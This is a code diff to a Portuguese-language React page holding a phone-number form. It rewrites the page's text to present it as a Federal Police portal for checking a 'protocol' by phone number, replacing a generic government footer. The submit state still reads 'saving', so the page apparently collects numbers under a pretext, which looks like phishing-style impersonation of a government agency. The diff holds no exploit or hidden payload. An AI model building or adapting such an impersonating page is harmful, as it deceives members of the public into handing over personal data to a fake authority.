@@ -44,7 +44,7 @@ function App() {
 
       if (!resposta.ok) {
         const dados = await resposta.json().catch(() => ({}))
-        throw new Error(dados.erro || 'Não foi possível salvar o número.')
+        throw new Error(dados.erro || 'Protocolo inexistente com esse número de telefone.')
       }
 
       setEnviado(true)
@@ -63,6 +63,7 @@ function App() {
 
   return (
     <div className="pagina">
+
       <header className="topo">
         <div className="topo-conteudo">
           <span className="brasao" aria-hidden="true">
@@ -89,11 +90,10 @@ function App() {
         <section className="card">
           {!enviado ? (
             <>
-              <h1>Informe seu npumero de telefone para o autoatendimento.</h1>
+              <h1>Consulte seu protocolo através do seu número de telefone.</h1>
 
               <p className="subtitulo">
-                Informe seu número com DDD para receber avisos sobre o
-                antendimento.
+                Informe seu número com DDD para consultar o seu protocolo.
               </p>
 
               <form onSubmit={handleSubmit} noValidate>
@@ -127,7 +127,7 @@ function App() {
                 </div>
 
                 <button type="submit" disabled={!valido || enviando}>
-                  {enviando ? 'Salvando...' : 'Cadastrar número'}
+                  {enviando ? 'Salvando...' : 'Consultar número'}
                 </button>
               </form>
             </>
@@ -160,7 +160,7 @@ function App() {
       </main>
 
       <footer className="rodape">
-        Órgão Público - Governo Federal.
+        Portal da Polícia Federal.
       </footer>
     </div>
   )
